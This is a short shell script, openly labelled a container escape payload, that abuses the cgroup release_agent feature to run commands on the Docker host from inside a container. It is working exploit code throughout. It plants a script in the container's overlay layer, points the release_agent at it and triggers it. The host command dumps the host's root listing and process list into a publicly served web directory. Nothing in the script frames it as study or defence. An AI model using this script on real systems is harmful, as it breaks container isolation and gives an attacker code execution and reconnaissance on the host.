#!/bin/sh
#
# CONTAINER ESCAPE PAYLOAD via cgroup release_agent
#

# Path on the host to our container's writable layer
# We get this from the 'mount' command output: upperdir=...
HOST_PATH=/var/lib/docker/overlay2/fd98dd3c97ea004eba5b19eb31315f618d888cf7021078d7102f9c5d012ccbe0/diff

# Command we want to execute on the HOST
# We will list the root directory of the HOST and a few other sensitive files,
# and write the output into a file inside our container's web directory.
CMD_ON_HOST="#!/bin/sh \n ls -la / > ${HOST_PATH}/app/public/host_root.txt \n ps aux >> ${HOST_PATH}/app/public/host_root.txt"

# 1. Create the command script on our container's filesystem
#    This script will be accessible from the host via the HOST_PATH.
echo -e "$CMD_ON_HOST" > /app/pwn.sh
chmod +x /app/pwn.sh

# 2. Setup the cgroup mount point
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# 3. Configure the evil release_agent
echo 1 > /tmp/cgrp/notify_on_release
echo "${HOST_PATH}/app/pwn.sh" > /tmp/cgrp/release_agent

# 4. Trigger the exploit
#    We run a dumb process inside our cgroup. When it exits, the cgroup becomes empty,
#    and the host's kernel executes our release_agent command.
echo "Running trigger..." > /app/public/escape_status.txt
sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"

# Give it a second to run
sleep 2
echo "Trigger finished. Check for /host_root.txt" >> /app/public/escape_status.txt
